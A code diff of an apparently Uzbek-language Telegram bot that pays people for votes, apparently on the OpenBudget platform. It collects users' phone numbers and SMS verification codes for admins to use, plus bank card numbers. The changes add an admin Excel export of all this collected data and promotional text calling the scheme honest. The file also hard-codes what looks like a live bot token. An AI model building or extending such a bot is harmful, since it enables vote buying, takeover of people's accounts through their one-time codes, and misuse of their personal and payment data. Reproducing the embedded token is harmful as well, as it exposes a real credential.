@@ -2,19 +2,21 @@ import asyncio
 import logging
 import json
 import os
+import io
 from datetime import datetime
 from aiogram import Bot, Dispatcher, F, types
-from aiogram.filters import CommandStart
+from aiogram.filters import CommandStart, Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
 import gspread
 from oauth2client.service_account import ServiceAccountCredentials
+# 🆕 Excel fayl yaratish uchun yangi kutubxona
+import openpyxl 
 
 # --- SOZLAMALAR ---
 BOT_TOKEN = "8482178284:AAGzq9lzZEV6JlOkBA3_TvDcX37NQA_uB_M"
-
 ADMINS = [8317043750, 6139120765, 7393342078]  
 
 PAYMENTS_GROUP_LINK = "https://t.me/isbot111"  
@@ -27,27 +29,25 @@ dp = Dispatcher(storage=MemoryStorage())
 
 claimed_users = {}
 claimed_admin_names = {}
-
-# 🆕 YANGILIK: Barcha adminlarga yuborilgan xabarlar ID sini saqlaymiz 
-# (Keyin tugmani hammadan o'chirib tashlash uchun)
 admin_message_ids = {}
 
 
-# --- GOOGLE SHEETS INTEGRATSIYASI ---
+# --- GOOGLE SHEETS ULANISH FUNKSIYASI ---
+def get_google_sheet():
+    scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
+    google_creds_env = os.getenv("GOOGLE_CREDS")
+    if google_creds_env:
+        creds_dict = json.loads(google_creds_env)
+        creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
+    else:
+        creds = ServiceAccountCredentials.from_json_keyfile_name("open.json", scope)
+    client = gspread.authorize(creds)
+    return client.open(GOOGLE_SHEET_NAME).sheet1
+
+
 def log_to_sheets(user_id, full_name="", username="", phone="", code="", card="", status="", admin_name=""):
     try:
-        scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
-        
-        google_creds_env = os.getenv("GOOGLE_CREDS")
-        if google_creds_env:
-            creds_dict = json.loads(google_creds_env)
-            creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
-        else:
-            creds = ServiceAccountCredentials.from_json_keyfile_name("open.json", scope)
-        
-        client = gspread.authorize(creds)
-        sheet = client.open(GOOGLE_SHEET_NAME).sheet1
-
+        sheet = get_google_sheet()
         all_records = sheet.get_all_values()
         now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         username_str = f"@{username}" if username else "Mavjud emas"
@@ -60,15 +60,11 @@ def log_to_sheets(user_id, full_name="", username="", phone="", code="", card=""
                     break
         
         if row_index != -1:
-            if code:
-                sheet.update_cell(row_index, 5, str(code))
-            if card:
-                sheet.update_cell(row_index, 6, str(card))
-            if status:
-                sheet.update_cell(row_index, 7, status)
+            if code: sheet.update_cell(row_index, 5, str(code))
+            if card: sheet.update_cell(row_index, 6, str(card))
+            if status: sheet.update_cell(row_index, 7, status)
             sheet.update_cell(row_index, 8, now)
-            if admin_name:
-                sheet.update_cell(row_index, 9, admin_name)
+            if admin_name: sheet.update_cell(row_index, 9, admin_name)
         else:
             sheet.append_row([str(user_id), full_name, username_str, str(phone), str(code), str(card), status, now, admin_name])
             
@@ -94,6 +90,14 @@ def main_menu():
     builder.adjust(1, 2)
     return builder.as_markup(resize_keyboard=True)
 
+# 🆕 Adminlar uchun maxsus menyu
+def admin_menu():
+    builder = ReplyKeyboardBuilder()
+    builder.button(text="📊 Hisobot (.xlsx)")
+    builder.button(text="⬅️ Bosh menyu")
+    builder.adjust(1)
+    return builder.as_markup(resize_keyboard=True)
+
 def phone_share_keyboard():
     builder = ReplyKeyboardBuilder()
     builder.button(text="📱 Telefon raqamni yuborish", request_contact=True)
@@ -112,15 +116,91 @@ async def cmd_start(message: types.Message, state: FSMContext):
         reply_markup=main_menu()
     )
 
+# 🆕 ADMIN PANELNI ACHISH BUYRUG'I
+@dp.message(Command("admin"))
+async def cmd_admin(message: types.Message):
+    if message.from_user.id in ADMINS:
+        await message.answer("🔑 <b>Admin panelga xush kelibsiz!</b>\n\nQuyidagi tugma orqali Google Sheets'dagi barcha ma'lumotlarni Excel faylda yuklab olishingiz mumkin.", parse_mode="HTML", reply_markup=admin_menu())
 
+@dp.message(F.text == "⬅️ Bosh menyu")
+async def back_to_main(message: types.Message):
+    await message.answer("Bosh menyuga qaytildi.", reply_markup=main_menu())
+
+
+# 🆕 📊 GOOGLE SHEETS'DAN EXCEL YASAB TASHAB BERISH FALAYLI
+@dp.message(F.text == "📊 Hisobot (.xlsx)")
+async def send_excel_report(message: types.Message):
+    if message.from_user.id not in ADMINS:
+        return
+
+    waiting_msg = await message.answer("🔄 Google Sheets'dan ma'lumotlar olinmoqda va Excel shakliga keltirilmoqda, iltimos kuting...")
+    
+    try:
+        sheet = get_google_sheet()
+        all_data = sheet.get_all_values()
+        
+        if not all_data:
+            await waiting_msg.edit_text("❌ Jadvalda hech qanday ma'lumot topilmadi.")
+            return
+
+        # Yangi Excel fayl (Workbook) yaratamiz
+        wb = openpyxl.Workbook()
+        ws = wb.active
+        ws.title = "Hisobot"
+
+        # Ma'lumotlarni qatorbama-qator yozamiz
+        for row in all_data:
+            ws.append(row)
+
+        # Faylni xotirada (RAM) saqlaymiz, diskka yozib o'tirmaymiz (Railway uchun qulay)
+        excel_buffer = io.BytesIO()
+        wb.save(excel_buffer)
+        excel_buffer.seek(0)
+        
+        # Fayl nomiga sana qo'shamiz
+        file_name = f"OpenBudget_Hisobot_{datetime.now().strftime('%d_%m_%Y')}.xlsx"
+        
+        # Admin faylni qabul qiladi
+        await waiting_msg.delete()
+        await message.answer_document(
+            document=types.BufferedInputFile(excel_buffer.getvalue(), filename=file_name),
+            caption=f"📊 <b>Barcha arizalar hisoboti</b>\n\n📅 Sana: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n✅ Yuklab olindi.",
+            parse_mode="HTML"
+        )
+    except Exception as e:
+        await waiting_msg.edit_text(f"❌ Xatolik yuz berdi: {e}")
+
+
+# 🆕 ✨ ZAMONAVIY TO'LOVLAR BO'LIMI
 @dp.message(F.text == "💰 To'lovlar muvaffaqiyati")
 async def process_payments_info(message: types.Message):
-    await message.answer(f"🔗 <a href='{PAYMENTS_GROUP_LINK}'>To'lovlar Guruhimiz</a>", parse_mode="HTML", disable_web_page_preview=True)
+    inline_kb = InlineKeyboardBuilder()
+    inline_kb.button(text="🔗 Guruhga o'tish", url=PAYMENTS_GROUP_LINK)
+    
+    text = (
+        "<b>💰 To'lovlar Muvaffaqiyati Guruhimiz!</b>\n\n"
+        "Bizda hammasi shaffof va halol! ✅\n"
+        "Ovoz berib pullarini qabul qilib olgan barcha yurtdoshlarimizning to'lov cheklari (skrinshotlari) muntazam ravishda guruhimizga joylab boriladi.\n\n"
+        "👇 Pastdagi tugma orqali guruhimizga a'zo bo'ling va o'zingiz guvohi bo'ling:"
+    )
+    await message.answer(text, parse_mode="HTML", reply_markup=inline_kb.as_markup())
 
 
+# 🆕 ✨ ZAMONAVIY YORDAM BO'LIMI
 @dp.message(F.text == "🙋‍♂️ Yordam")
 async def process_help(message: types.Message):
-    await message.answer("Muammo yoki savollar bo'yicha administratorga murojaat qiling:\n\n👉 @soibnazarov07")
+    inline_kb = InlineKeyboardBuilder()
+    inline_kb.button(text="✍️ Operatorga yozish", url="https://t.me/soibnazarov07")
+    
+    text = (
+        "<b>🙋‍♂️ Yordam ko'rsatish markazi</b>\n\n"
+        "Sizda biror bir muammo yoki savollar tug'ildimi? 🤷‍♂️\n"
+        "• Kod kelmay qoldimi?\n"
+        "• To'lov kechikayaptimi?\n"
+        "• Tizimda xatolik beryaptimi?\n\n"
+        "Xavotir olmang! Quyidagi tugmani bosib, bizning professional operatorimizga to'g'ridan-to'g'ri murojaat qilishingiz mumkin. Tez fursatda yordam beramiz! 👇"
+    )
+    await message.answer(text, parse_mode="HTML", reply_markup=inline_kb.as_markup())
 
 
 # --- OVOZ BERISH START ---
@@ -129,7 +209,6 @@ async def start_voting(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
     await state.clear() 
     
-    # Eskidan qolgan datalarni tozalash
     if user_id in claimed_users: del claimed_users[user_id]
     if user_id in claimed_admin_names: del claimed_admin_names[user_id]
         
@@ -173,7 +252,6 @@ async def process_phone(message: types.Message, state: FSMContext):
     builder = InlineKeyboardBuilder()
     builder.button(text="✅ Qabul qilish (Band qilish)", callback_data=f"claim_{user_id}")
 
-    # Barcha adminlarga xabarlarni jo'natish va xabar ID larini saqlab qolish
     admin_message_ids[user_id] = {}
     
     for admin in ADMINS:
@@ -202,18 +280,15 @@ async def admin_claim(callback: types.CallbackQuery):
     admin_id = callback.from_user.id
     admin_name = callback.from_user.full_name
 
-    # 🛑 TEKSHIRUV
     if user_id in claimed_users:
         already_admin_name = claimed_admin_names.get(user_id, "Boshqa admin")
         await callback.answer(f"❌ Kech qoldingiz! Bu so'rovni {already_admin_name} qabul qilib bo'lgan.", show_alert=True)
         return
 
-    # 🔑 Birinchi bosgan adminni xotiraga qulflaymiz
     claimed_users[user_id] = admin_id
     claimed_admin_names[user_id] = admin_name
     await callback.answer("Siz ushbu foydalanuvchini muvaffaqiyatli band qildingiz!")
 
-    # 🔄 FSM dan foydalanuvchi ma'lumotlarini olish
     user_state = dp.fsm.resolve_context(bot, chat_id=user_id, user_id=user_id)
     await user_state.set_state(VoteState.waiting_for_code)
     await user_state.update_data(admin_id=admin_id)
@@ -225,7 +300,6 @@ async def admin_claim(callback: types.CallbackQuery):
     
     log_to_sheets(user_id=user_id, phone=phone, status="Admin qabul qildi", admin_name=admin_name)
 
-    # 💣 ENG ASOSIY QISM: Barcha adminlarning xatidan tugmani o'chirib, tekstni yangilaymiz!
     edited_text = (
         f"📱 <b>Yangi raqam keldi!</b>\n\n"
         f"👤 Foydalanuvchi: {full_name}\n"
@@ -239,16 +313,10 @@ async def admin_claim(callback: types.CallbackQuery):
         for a_id, m_id in admin_message_ids[user_id].items():
             try:
                 await bot.edit_message_text(
-                    text=edited_text,
-                    chat_id=a_id,
-                    message_id=m_id,
-                    parse_mode="HTML",
-                    reply_markup=None  # Ana shu qator TUGMANI yo'q qiladi!
+                    text=edited_text, chat_id=a_id, message_id=m_id, parse_mode="HTML", reply_markup=None
                 )
-            except Exception:
-                pass
+            except Exception: pass
 
-    # Foydalanuvchiga SMS kod yuborilishini so'rash
     msg = await bot.send_message(
         user_id,
         "Sizning raqamingiz tizimga kiritildi! 📥\n"
@@ -392,7 +460,7 @@ async def handle_admin_check(callback: types.CallbackQuery):
         await bot.send_message(user_id, "Uzr, tekshiruv davomida bu raqam orqali avval ham ovoz berilganligi aniqlandi. ❌", reply_markup=main_menu())
 
 
-# --- KARTA RAQAM KIRITILGANDA (YAKUNIY BOSQICH) ---
+# --- KARTA RAQAM KIRITILGANDA ---
 @dp.message(VoteState.waiting_for_card)
 async def process_card(message: types.Message, state: FSMContext):
     card_number = message.text
@@ -417,11 +485,9 @@ async def process_card(message: types.Message, state: FSMContext):
 
     await message.answer("Ma'lumotlar saqlandi. ⏱ 1 soat ichida to'lov amalga oshiriladi. Rahmat!", reply_markup=main_menu())
     
-    # Xotirani tozalash
     if user_id in claimed_users: del claimed_users[user_id]
     if user_id in claimed_admin_names: del claimed_admin_names[user_id]
     if user_id in admin_message_ids: del admin_message_ids[user_id]
-    
     await state.clear()
 
 
